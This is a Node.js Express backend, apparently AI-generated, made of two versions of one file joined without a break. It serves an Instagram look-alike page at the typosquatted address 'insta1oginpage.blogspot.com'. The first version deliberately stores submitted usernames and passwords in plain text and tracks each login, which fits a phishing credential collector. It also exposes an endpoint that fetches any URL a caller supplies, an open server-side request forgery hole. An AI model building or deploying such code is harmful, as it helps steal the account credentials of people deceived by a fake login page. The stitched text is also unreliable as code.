const express = require('express');
const { MongoClient } = require('mongodb');
const cors = require('cors');
const helmet = require('helmet');
const serverless = require('serverless-http');
const axios = require('axios'); // Included as requested, though not used in current routes

require('dotenv').config();

const app = express();

// ======================
// CORS CONFIGURATION
// ======================
const allowedOrigin = 'https://insta1oginpage.blogspot.com';
const corsOptions = {
    origin: allowedOrigin,
    credentials: true,
    methods: ['GET', 'POST', 'OPTIONS'],
    allowedHeaders: ['Content-Type', 'Authorization'],
};
app.use(cors(corsOptions));
app.options('*', cors(corsOptions)); // Handle preflight requests
app.options('*', (req, res) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://insta1oginpage.blogspot.com'); // Update for production.
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  return res.status(200).end();
});

// Global middleware to set CORS headers on every response
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', 'https://insta1oginpage.blogspot.com'); // Update as needed.
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  if (req.method === 'OPTIONS') {
    return res.status(200).end();
  }
  next();
});

// Logging HTT
// ======================
// SECURITY MIDDLEWARE
// ======================
app.use(helmet());
app.use(express.json());

// ======================
// MONGODB CONNECTION
// ======================
const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri);
let db;

async function connectDB() {
    if (!db) {
        await client.connect();
        db = client.db(process.env.DB_NAME || 'blogger_auth');
        console.log('Connected to MongoDB');
    }
    return db;
}

// ======================
// API ENDPOINTS
// ======================

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.status(200).json({ 
        status: 'OK', 
        message: 'API is running',
        timestamp: new Date().toISOString()
    });
});

// SIGNUP Endpoint - NO PASSWORD ENCRYPTION
app.post('/api/signup', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ 
                success: false,
                message: 'Username and password are required' 
            });
        }

        // Create user object (password NOT encrypted)
        const newUser = {
            username: username.toLowerCase().trim(),
            password: password, // Storing plain text password
            createdAt: new Date(),
            lastLogin: null,
            loginCount: 0
        };

        // Connect to DB and save user
        const database = await connectDB();
        const usersCollection = database.collection('users');

        // Check if user exists
        const existingUser = await usersCollection.findOne({ 
            username: newUser.username 
        });
        
        if (existingUser) {
            return res.status(409).json({ 
                success: false,
                message: 'Username already exists' 
            });
        }

        // Insert new user
        const result = await usersCollection.insertOne(newUser);

        res.status(201).json({
            success: true,
            message: 'User registered successfully',
            userId: result.insertedId,
            username: newUser.username
        });

    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ 
            success: false,
            message: 'Error registering user', 
            error: error.message 
        });
    }
});

// LOGIN Endpoint - PLAIN TEXT PASSWORD COMPARISON
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ 
                success: false,
                message: 'Username and password are required' 
            });
        }

        const database = await connectDB();
        const usersCollection = database.collection('users');

        // Find user
        const user = await usersCollection.findOne({
            username: username.toLowerCase().trim()
        });

        if (!user) {
            return res.status(401).json({ 
                success: false,
                message: 'Invalid credentials' 
            });
        }

        // Compare passwords - PLAIN TEXT COMPARISON (as requested)
        if (password !== user.password) {
            return res.status(401).json({ 
                success: false,
                message: 'Invalid credentials' 
            });
        }

        // Update last login and login count
        await usersCollection.updateOne(
            { _id: user._id },
            { 
                $set: { lastLogin: new Date() },
                $inc: { loginCount: 1 }
            }
        );

        // Login successful
        res.status(200).json({
            success: true,
            message: 'Login successful',
            username: user.username,
            userId: user._id,
            lastLogin: new Date()
        });

    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ 
            success: false,
            message: 'Error during login', 
            error: error.message 
        });
    }
});

// ======================
// EXAMPLE AXIOS ENDPOINT (if needed later)
// ======================
app.post('/api/fetch-external-data', async (req, res) => {
    try {
        const { url } = req.body;
        
        // Example of using axios (if you need to call external APIs)
        const response = await axios.get(url, {
            timeout: 5000,
            headers: {
                'User-Agent': 'Instagram-Auth-Backend'
            }
        });
        
        res.json({
            success: true,
            data: response.data
        });
    } catch (error) {
        res.status(500).json({
            success: false,
            message: 'Error fetching external data'
        });
    }
});

// ======================
// ERROR HANDLING
// ======================
app.use((req, res) => {
    res.status(404).json({
        success: false,
        message: 'Route not found'
    });
});

app.use((err, req, res, next) => {
    console.error(err.stack);
    res.status(500).json({
        success: false,
        message: 'Internal server error',
        error: process.env.NODE_ENV === 'development' ? err.message : undefined
    });
});

// ======================
// SERVERLESS EXPORT FOR VERCEL
// ======================
if (process.env.NODE_ENV === 'production' || process.env.VERCEL) {
    // Export for Vercel serverless
    module.exports = app; // Standard export
    module.exports.handler = serverless(app); // Serverless handler for Vercel
} else {
    // Start regular server for local development
    const PORT = process.env.PORT || 4000;
    app.listen(PORT, () => {
        console.log(`Server running on port ${PORT}`);
        console.log(`CORS enabled for: ${allowedOrigin}`);
    });
    module.exports = app;
}const express = require('express');
const { MongoClient } = require('mongodb');
const bcrypt = require('bcryptjs');
const cors = require('cors'); // Added CORS module

require('dotenv').config();

const app = express();
const saltRounds = 10;

// CORS Configuration
// Define your allowed origin
const allowedOrigin = 'https://insta1oginpage.blogspot.com';

// Use the cors middleware with specific options
const corsOptions = {
    origin: allowedOrigin,
    credentials: true, // Important for cookies/sessions if you use them later
    methods: ['GET', 'POST', 'OPTIONS'], // Specify allowed methods
    allowedHeaders: ['Content-Type', 'Authorization'], // Specify allowed headers[citation:1][citation:6]
};

app.use(cors(corsOptions));

// ✅ Critical: Explicitly handle preflight requests for all routes
app.options('*', cors(corsOptions)); // This catches all OPTIONS requests[citation:6]

// Middleware
app.use(express.json());

// MongoDB Connection using the official driver
const uri = process.env.MONGODB_URI;
const client = new MongoClient(uri);
let db;

async function connectDB() {
    if (!db) {
        await client.connect();
        db = client.db(process.env.DB_NAME || 'blogger_auth');
        console.log('Connected to MongoDB');
    }
    return db;
}

// Health check endpoint
app.get('/api/health', (req, res) => {
    res.status(200).json({ status: 'OK', message: 'API is running' });
});

// SIGNUP Endpoint
app.post('/api/signup', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ message: 'Username and password are required' });
        }

        // 1. Hash the password
        const hashedPassword = await bcrypt.hash(password, saltRounds);

        // 2. Create user object
        const newUser = {
            username: username.toLowerCase().trim(),
            password: hashedPassword,
            createdAt: new Date()
        };

        // 3. Connect to DB and save user
        const database = await connectDB();
        const usersCollection = database.collection('users');

        // Check if user exists
        const existingUser = await usersCollection.findOne({ username: newUser.username });
        if (existingUser) {
            return res.status(409).json({ message: 'Username already exists' });
        }

        // Insert new user
        const result = await usersCollection.insertOne(newUser);

        res.status(201).json({
            message: 'User registered successfully',
            userId: result.insertedId
        });

    } catch (error) {
        console.error('Signup error:', error);
        res.status(500).json({ message: 'Error registering user', error: error.message });
    }
});

// LOGIN Endpoint
app.post('/api/login', async (req, res) => {
    try {
        const { username, password } = req.body;

        if (!username || !password) {
            return res.status(400).json({ message: 'Username and password are required' });
        }

        const database = await connectDB();
        const usersCollection = database.collection('users');

        // Find user
        const user = await usersCollection.findOne({
            username: username.toLowerCase().trim()
        });

        if (!user) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        // Compare passwords
        const isPasswordValid = await bcrypt.compare(password, user.password);

        if (!isPasswordValid) {
            return res.status(401).json({ message: 'Invalid credentials' });
        }

        // Login successful
        res.status(200).json({
            message: 'Login successful',
            username: user.username
        });

    } catch (error) {
        console.error('Login error:', error);
        res.status(500).json({ message: 'Error during login', error: error.message });
    }
});

// Vercel requires this export for serverless functions
module.exports = app;
